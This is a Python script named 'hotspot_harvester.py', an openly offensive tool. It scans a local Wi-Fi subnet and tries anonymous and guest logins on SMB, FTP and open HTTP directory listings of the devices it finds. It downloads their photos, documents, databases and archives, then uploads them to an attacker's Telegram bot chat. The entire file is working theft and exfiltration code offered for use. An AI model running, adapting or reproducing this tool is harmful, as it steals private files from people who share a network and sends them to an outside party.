#!/usr/bin/env python3
"""
hotspot_harvester.py - CREATOR @WAKLUTT
References:
• RFC 791 (IP), RFC 826 (ARP)
• SMB: [MS-SMB] Microsoft
• FTP: RFC 959
• Telegram Bot API: https://core.telegram.org/bots/api
"""

import os
import sys
import time
import logging
import socket
import ipaddress
import subprocess
import re
import json
from typing import List, Dict, Optional, Tuple
from datetime import datetime

TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOOKEN" 
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID" # Palitan moyan inamoka
SCAN_SUBNET = "" # Leave empty to auto-detect
DOWNLOAD_DIR = "harvested_files"
SCAN_TIMEOUT = 2
PORT_SCAN_THREADS = 20
FILE_EXTENSIONS = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.pdf', '.doc', '.docx',
                   '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.zip', '.rar', '.7z',
                   '.tar', '.gz', '.py', '.js', '.html', '.xml', '.json', '.sqlite',
                   '.apk', '.mp3', '.mp4', '.avi', '.mkv', '.csv')

# --- Third-party imports with graceful fallback ---
try:
    import scapy.all as scapy
    from scapy.layers.l2 import ARP, Ether
    from scapy.sendrecv import srp
except ImportError:
    print("[!] Scapy not installed. Install: pip install scapy")
    sys.exit(1)

try:
    from smb.SMBConnection import SMBConnection
except ImportError:
    print("[!] pysmb not installed. Install: pip install pysmb")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("[!] requests not installed. Install: pip install requests")
    sys.exit(1)

# --- Logging setup ---
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] [%(levelname)s] - %(message)s",
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger("HotspotHarvester")

# --- Helper Functions ---

def get_local_subnet() -> str:
    """Determine the /24 subnet of the primary network interface."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
        base = '.'.join(local_ip.split('.')[:3])
        return f"{base}.0/24"
    except Exception as e:
        logger.error(f"Auto-detect subnet failed: {e}")
        # Fallback to common ranges
        for guess in ['192.168.1.0/24', '192.168.0.0/24', '10.0.0.0/24']:
            logger.info(f"Trying fallback subnet: {guess}")
            return guess
        raise RuntimeError("Unable to determine subnet. Set SCAN_SUBNET.")

def arp_scan(subnet: str) -> List[str]:
    """Send ARP requests to find active hosts."""
    logger.info(f"Scanning subnet {subnet} with ARP...")
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet),
                     timeout=SCAN_TIMEOUT, verbose=0, retry=1)
        active = list(set([received.psrc for _, received in ans]))
        logger.info(f"Found {len(active)} active hosts via ARP.")
        return active
    except PermissionError:
        logger.warning("ARP scan needs root. Falling back to ping.")
        return []
    except Exception as e:
        logger.error(f"ARP scan error: {e}")
        return []

def ping_scan(subnet: str) -> List[str]:
    """Fallback: ICMP ping sweep."""
    base = subnet.rsplit('.', 1)[0]
    active = []
    logger.info("Starting ICMP ping sweep (this may take 2-3 minutes)...")
    for i in range(1, 255):
        ip = f"{base}.{i}"
        try:
            # Check if ping exists
            subprocess.check_output(['ping', '-c', '1', '-W', '1', ip],
                                    stderr=subprocess.DEVNULL, timeout=2)
            active.append(ip)
            logger.debug(f"Host {ip} is up.")
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
            continue
    logger.info(f"Found {len(active)} active hosts via ping.")
    return active

def port_scan(ip: str, ports: List[int]) -> Dict[int, bool]:
    """Quick TCP connect scan."""
    results = {}
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            results[port] = (sock.connect_ex((ip, port)) == 0)
            sock.close()
        except Exception:
            results[port] = False
    return results

# ---------- FIXED safe_filename ----------
def safe_filename(remote_path: str, ip: str, prefix: str) -> str:
    """Sanitize remote path to a valid local filename."""
    clean = remote_path.lstrip('/').replace('/', '').replace('\\', '')
    clean = re.sub(r'[<>:"/|?*]', '', clean)
    if len(clean) > 200:
        clean = clean[:200]
    return os.path.join(DOWNLOAD_DIR, f"{ip}{prefix}_{clean}")

# --- Service Attackers --- CREATOR @WAKLUTT

class SMBAttacker:
    def __init__(self, ip: str):
        self.ip = ip
        self.conn = None
        self.connected = False
        self.creds = [('', '', ''), ('guest', '', ''), ('public', '', ''), ('anonymous', '', '')]

    def try_connect(self) -> bool:
        for user, pwd, domain in self.creds:
            try:
                conn = SMBConnection(user, pwd, 'HARVESTER', 'TARGET',
                                     domain=domain, use_ntlm_v2=True, is_direct_tcp=True)
                if conn.connect(self.ip, 445, timeout=5):
                    self.conn = conn
                    self.connected = True
                    logger.info(f"[SMB] Connected to {self.ip} with user: '{user}'")
                    return True
            except Exception:
                continue
        return False

    def list_shares(self) -> List[str]:
        if not self.connected:
            return []
        try:
            shares = self.conn.listShares()
            return [s.name for s in shares if not s.name.endswith('$')]
        except Exception:
            return []

    def walk_share(self, share: str, path: str = '/', depth: int = 0) -> List[Tuple[str, int]]:
        if depth > 4:
            return []
        files = []
        try:
            items = self.conn.listPath(share, path)
            for item in items:
                if item.filename in ['.', '..']:
                    continue
                full_path = f"{path}/{item.filename}" if path != '/' else f"/{item.filename}"
                if item.isDirectory:
                    files.extend(self.walk_share(share, full_path, depth+1))
                else:
                    if item.filename.lower().endswith(FILE_EXTENSIONS):
                        files.append((full_path, item.file_size))
        except Exception:
            pass
        return files

    def download_file(self, share: str, remote_path: str, local_path: str) -> bool:
        try:
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            with open(local_path, 'wb') as f:
                self.conn.retrieveFile(share, remote_path, f)
            return True
        except Exception:
            return False

    def harvest(self) -> List[str]:
        downloaded = []
        if not self.try_connect():
            return downloaded
        shares = self.list_shares()
        for share in shares:
            logger.info(f"[SMB] Enumerating share: {share}")
            file_list = self.walk_share(share)
            for remote_path, size in file_list:
                local_path = safe_filename(remote_path, self.ip, "smb")
                if self.download_file(share, remote_path, local_path):
                    downloaded.append(local_path)
                    logger.info(f"[SMB] Downloaded: {remote_path} ({size} bytes)")
        return downloaded

class FTPAttacker:
    def __init__(self, ip: str):
        self.ip = ip
        self.ftp = None

    def try_connect(self) -> bool:
        import ftplib
        try:
            ftp = ftplib.FTP(self.ip, timeout=5)
            ftp.login()
            self.ftp = ftp
            logger.info(f"[FTP] Connected to {self.ip} anonymously.")
            return True
        except Exception:
            return False

    def walk_ftp(self, path: str = '/', depth: int = 0) -> List[Tuple[str, int]]:
        if depth > 4:
            return []
        files = []
        try:
            items = self.ftp.nlst(path) if path else self.ftp.nlst()
            for item in items:
                full_path = f"{path}/{item}" if path != '/' else f"/{item}"
                try:
                    self.ftp.cwd(full_path)
                    self.ftp.cwd('..')
                    files.extend(self.walk_ftp(full_path, depth+1))
                except Exception:
                    if item.lower().endswith(FILE_EXTENSIONS):
                        try:
                            size = self.ftp.size(full_path)
                        except Exception:
                            size = 0
                        files.append((full_path, size))
        except Exception:
            pass
        return files

    def download_file(self, remote_path: str, local_path: str) -> bool:
        try:
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            with open(local_path, 'wb') as f:
                self.ftp.retrbinary(f"RETR {remote_path}", f.write)
            return True
        except Exception:
            return False

    def harvest(self) -> List[str]:
        downloaded = []
        if not self.try_connect():
            return downloaded
        file_list = self.walk_ftp()
        for remote_path, size in file_list:
            local_path = safe_filename(remote_path, self.ip, "ftp")
            if self.download_file(remote_path, local_path):
                downloaded.append(local_path)
                logger.info(f"[FTP] Downloaded: {remote_path} ({size} bytes)")
        try:
            self.ftp.quit()
        except Exception:
            pass
        return downloaded

class HTTPAttacker:
    def __init__(self, ip: str):
        self.ip = ip
        self.ports = [80, 8080, 8000, 5000, 3000, 8888]

    def harvest(self) -> List[str]:
        downloaded = []
        for port in self.ports:
            base_url = f"http://{self.ip}:{port}"
            try:
                r = requests.get(base_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200 and ('Index of' in r.text or '<title>Index of' in r.text):
                    logger.info(f"[HTTP] Directory listing on {base_url}")
                    links = re.findall(r'href="([^"]+)"', r.text)
                    for link in links:
                        if link.startswith('/') or link.startswith('.'):
                            continue
                        if link.endswith(FILE_EXTENSIONS):
                            full_url = f"{base_url}/{link}"
                            local_path = safe_filename(link, self.ip, "http")
                            try:
                                r2 = requests.get(full_url, timeout=10)
                                if r2.status_code == 200:
                                    os.makedirs(os.path.dirname(local_path), exist_ok=True)
                                    with open(local_path, 'wb') as f:
                                        f.write(r2.content)
                                    downloaded.append(local_path)
                                    logger.info(f"[HTTP] Downloaded: {full_url}")
                            except Exception:
                                continue
            except Exception:
                continue
        return downloaded

# --- Telegram Sender with Full Error Handling ---

def send_to_telegram(file_paths: List[str]) -> None:
    """Send files to Telegram with exponential backoff and error checking."""
    token = TELEGRAM_BOT_TOKEN
    chat_id = TELEGRAM_CHAT_ID

    if not token or not chat_id or token == "YOUR_BOT_TOKEN":
        logger.error("Telegram credentials missing or invalid. Skipping send.")
        return

    if not file_paths:
        logger.warning("No files to send.")
        return

    base_url = f"https://api.telegram.org/bot{token}"

    # First, send a notification text
    try:
        msg = f"📦 Harvest complete! Found {len(file_paths)} file(s). Sending now..."
        requests.post(f"{base_url}/sendMessage", json={"chat_id": chat_id, "text": msg}, timeout=5)
    except Exception:
        logger.warning("Could not send start notification.")

    for idx, file_path in enumerate(file_paths, 1):
        if not os.path.exists(file_path):
            logger.warning(f"File missing: {file_path}")
            continue

        # Check file size (Telegram limit: 50 MB)
        try:
            size = os.path.getsize(file_path)
            if size > 50 * 1024 * 1024:
                logger.warning(f"Skipping {file_path} - too large ({size} bytes).")
                continue
            if size == 0:
                logger.warning(f"Skipping {file_path} - empty file.")
                continue
        except Exception:
            continue

        # Upload with retry logic (handling 429 rate limits)
        retries = 3
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as f:
                    files = {'document': f}
                    data = {'chat_id': chat_id}
                    resp = requests.post(f"{base_url}/sendDocument", files=files, data=data, timeout=30)

                if resp.status_code == 200:
                    json_resp = resp.json()
                    if json_resp.get('ok'):
                        logger.info(f"[Telegram] Sent ({idx}/{len(file_paths)}): {os.path.basename(file_path)}")
                        break
                    else:
                        error_desc = json_resp.get('description', 'Unknown error')
                        logger.error(f"[Telegram] API error: {error_desc}")
                        if resp.status_code == 400:
                            break
                elif resp.status_code == 429:
                    retry_after = int(resp.json().get('parameters', {}).get('retry_after', 5))
                    logger.warning(f"Rate limited. Waiting {retry_after} seconds...")
                    time.sleep(retry_after + 1)
                    continue
                else:
                    logger.error(f"[Telegram] HTTP {resp.status_code}: {resp.text}")
                    if resp.status_code >= 400 and resp.status_code < 500:
                        break
                if attempt < retries - 1:
                    time.sleep(2 ** attempt)
            except requests.exceptions.Timeout:
                logger.error(f"[Telegram] Timeout sending {file_path}. Retrying...")
                time.sleep(2)
                continue
            except Exception as e:
                logger.error(f"[Telegram] Unexpected error: {e}")
                time.sleep(1)
                continue

        time.sleep(0.5)

    try:
        requests.post(f"{base_url}/sendMessage",
                      json={"chat_id": chat_id, "text": f"✅ Done. Total uploaded: {len(file_paths)} files."},
                      timeout=5)
    except Exception:
        pass

# --- Main Orchestrator ---

def main():
    import argparse

    parser = argparse.ArgumentParser(description="Local Wi-Fi file harvester")
    parser.add_argument('--target', help="Specific IP address to attack (skip scanning)")
    args = parser.parse_args()

    # Create download directory
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)

    # Determine targets
    if args.target:
        try:
            ipaddress.ip_address(args.target)
            selected_ips = [args.target]
            logger.info(f"Targeting specific IP: {args.target}")
        except ValueError:
            logger.error("Invalid IP format.")
            return
    else:
        subnet = SCAN_SUBNET if SCAN_SUBNET else get_local_subnet()
        logger.info(f"Scanning subnet: {subnet}")

        # Try ARP, fallback to ping
        active_ips = arp_scan(subnet)
        if not active_ips:
            active_ips = ping_scan(subnet)

        if not active_ips:
            logger.error("No active hosts found. Ensure you are connected to a network with other devices.")
            return

        # Interactive menu
        print("\n" + "="*50)
        print(" 🎯 ACTIVE HOSTS FOUND")
        print("="*50)
        for idx, ip in enumerate(active_ips, 1):
            print(f" [{idx}] {ip}")
        print("="*50)

        choice = input("\nEnter number, 'all', or 'q' to quit: ").strip().lower()
        if choice == 'q':
            logger.info("Exiting.")
            return
        elif choice == 'all':
            selected_ips = active_ips
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(active_ips):
                    selected_ips = [active_ips[idx]]
                else:
                    logger.error("Invalid number.")
                    return
            except ValueError:
                logger.error("Invalid input.")
                return

    # --- Harvest (FIXED INDENTATION) ---
    all_downloaded = []
    for ip in selected_ips:
        logger.info(f"🔍 Attacking {ip}")

        smb = SMBAttacker(ip)
        all_downloaded.extend(smb.harvest())

        ftp = FTPAttacker(ip)
        all_downloaded.extend(ftp.harvest())

        http = HTTPAttacker(ip)
        all_downloaded.extend(http.harvest())

    # Summary
    logger.info(f"✅ Total files harvested: {len(all_downloaded)}")
    if all_downloaded:
        logger.info("📤 Sending to Telegram...")
        send_to_telegram(all_downloaded)
    else:
        logger.info("No interesting files found. Telegram skipped.")

if __name__ == "__main__":     
    main()